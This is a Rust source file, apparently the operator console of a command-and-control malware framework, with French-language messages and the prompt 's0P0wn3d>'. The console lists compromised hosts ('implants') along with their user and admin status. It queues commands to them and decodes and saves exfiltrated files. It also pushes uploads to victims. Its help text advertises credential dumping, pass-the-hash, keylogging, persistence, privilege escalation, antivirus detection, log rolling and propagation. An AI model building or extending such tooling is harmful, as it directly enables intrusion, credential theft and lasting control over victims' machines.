use std::io::{self, BufRead, Write};
use std::sync::{Arc, Mutex};
use std::time::{SystemTime, UNIX_EPOCH};

use anyhow::Result;

use crate::store::Store;

pub fn run(store: Arc<Mutex<Store>>) -> Result<()> {
    let stdin = io::stdin();
    let mut current: Option<String> = None;

    loop {
        let prompt = prompt_string(&store, current.as_deref());
        print!("{}", prompt);
        io::stdout().flush().ok();

        let mut line = String::new();
        if stdin.lock().read_line(&mut line).is_err() || line.is_empty() {
            break;
        }
        let line = line.trim().to_string();
        if line.is_empty() {
            continue;
        }

        if !execute(&store, &mut current, &line) {
            break;
        }
    }
    Ok(())
}

fn prompt_string(store: &Arc<Mutex<Store>>, current: Option<&str>) -> String {
    match current {
        None => "s0P0wn3d> ".to_string(),
        Some(id) => {
            let s = store.lock().unwrap();
            match s.implant(id).ok().flatten() {
                Some(imp) => format!("{}/{} > ", imp.hostname, imp.username),
                None => format!("{}> ", &id[..8]),
            }
        }
    }
}

// Retourne false pour quitter la boucle.
fn execute(store: &Arc<Mutex<Store>>, current: &mut Option<String>, line: &str) -> bool {
    let parts: Vec<&str> = line.split_whitespace().collect();
    if parts.is_empty() {
        return true;
    }

    let cmd = match parts[0] {
        "ls" | "implants" => "implants",
        "?" | "h" => "help",
        "exit" => "quit",
        other => other,
    };
    let args = &parts[1..];

    match cmd {
        "quit" => return false,
        "help" => cmd_help(),
        "implants" => cmd_implants(store),
        "use" => cmd_use(store, current, args),
        "back" => *current = None,
        "tasks" => cmd_tasks(store, current),
        "results" => cmd_results(store),
        "upload" => cmd_upload(store, current, args),
        _ => cmd_send(store, current, cmd, args),
    }
    true
}

fn cmd_help() {
    println!("console : implants, use <n>, back, quit");
    println!("commandes implant : shell, bshell, persist, unpersist, creds, credsmachine,");
    println!("  crack, pth, loot, keylog, screenshot, privesc, rdp, detect, avscan,");
    println!("  logroll, propagate, syscall, whatever, run <script>");
    println!("transfert : download <chemin_distant>  |  upload <fichier_local> <chemin_distant>");
}

fn cmd_implants(store: &Arc<Mutex<Store>>) {
    let s = store.lock().unwrap();
    let rows = s.implants().unwrap_or_default();
    if rows.is_empty() {
        println!("[*] aucun implant");
        return;
    }
    let now = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap()
        .as_secs_f64();
    println!(
        "{:>2}  {:8}  {:22} {:18} {:5} {:>6}",
        "#", "id", "hôte", "utilisateur", "admin", "vu"
    );
    for (i, row) in rows.iter().enumerate() {
        let age = (now - row.last_seen) as u64;
        println!(
            "{:>2}  {:8}  {:22} {:18} {:5} {:>5}s",
            i + 1,
            &row.id[..8],
            &row.hostname[..row.hostname.len().min(22)],
            &row.username[..row.username.len().min(18)],
            if row.elevated { "oui" } else { "non" },
            age,
        );
    }
}

fn cmd_use(store: &Arc<Mutex<Store>>, current: &mut Option<String>, args: &[&str]) {
    let n: usize = args.first().and_then(|s| s.parse().ok()).unwrap_or(1);
    let s = store.lock().unwrap();
    let rows = s.implants().unwrap_or_default();
    if n == 0 || n > rows.len() {
        println!("[-] numéro invalide");
        return;
    }
    let id = rows[n - 1].id.clone();
    println!(
        "[*] implant {}/{} sélectionné",
        rows[n - 1].hostname, rows[n - 1].username
    );
    *current = Some(id);
}

fn cmd_tasks(store: &Arc<Mutex<Store>>, current: &Option<String>) {
    let id = match current {
        Some(id) => id,
        None => {
            println!("[-] aucun implant sélectionné");
            return;
        }
    };
    let s = store.lock().unwrap();
    for t in s.recent_tasks(id).unwrap_or_default() {
        println!("{:>5}  {:8}  {} {}", t.id, t.state, t.command, t.args);
    }
}

fn cmd_results(store: &Arc<Mutex<Store>>) {
    use base64::Engine;
    let s = store.lock().unwrap();
    let results = s.pending_results().unwrap_or_default();
    let ids: Vec<i64> = results.iter().map(|r| r.id).collect();
    for r in &results {
        println!("--- {} #{} {} {}", r.hostname, r.task_id, r.command, r.args);
        // Résultat d'un download : décode et sauvegarde sur disque.
        if r.command == "download" && r.body.starts_with("FILE:") {
            let b64 = &r.body[5..];
            let filename = r.args.trim()
                .rsplit('/').next()
                .or_else(|| r.args.trim().rsplit('\\').next())
                .unwrap_or("download");
            let save = format!("{}.bin", filename);
            match base64::engine::general_purpose::STANDARD.decode(b64) {
                Ok(bytes) => match std::fs::write(&save, &bytes) {
                    Ok(()) => println!("[+] {} octets sauvegardés → {}", bytes.len(), save),
                    Err(e) => println!("[-] sauvegarde: {}", e),
                },
                Err(e) => println!("[-] décodage base64: {}", e),
            }
        } else {
            println!("{}", r.body.trim_end());
        }
    }
    if !ids.is_empty() {
        s.mark_seen(&ids).ok();
    }
}

fn cmd_upload(
    store: &Arc<Mutex<Store>>,
    current: &Option<String>,
    args: &[&str],
) {
    use base64::Engine;
    let id = match current {
        Some(id) => id,
        None => {
            println!("[-] aucun implant sélectionné");
            return;
        }
    };
    if args.len() < 2 {
        println!("usage: upload <fichier_local> <chemin_distant>");
        return;
    }
    let local = args[0];
    let remote = args[1];
    match std::fs::read(local) {
        Ok(bytes) => {
            let b64 = base64::engine::general_purpose::STANDARD.encode(&bytes);
            let task_args = format!("{} {}", remote, b64);
            let s = store.lock().unwrap();
            match s.enqueue(id, "upload", &task_args) {
                Ok(task_id) => println!("[*] tâche {} en file ({} octets → {})", task_id, bytes.len(), remote),
                Err(e) => println!("[-] {}", e),
            }
        }
        Err(e) => println!("[-] lecture {}: {}", local, e),
    }
}

fn cmd_send(
    store: &Arc<Mutex<Store>>,
    current: &Option<String>,
    command: &str,
    args: &[&str],
) {
    let id = match current {
        Some(id) => id,
        None => {
            println!("[-] aucun implant sélectionné (implants puis use <n>)");
            return;
        }
    };
    let args_str = args.join(" ");
    let s = store.lock().unwrap();
    match s.enqueue(id, command, &args_str) {
        Ok(task_id) => println!("[*] tâche {} en file", task_id),
        Err(e) => println!("[-] {}", e),
    }
}
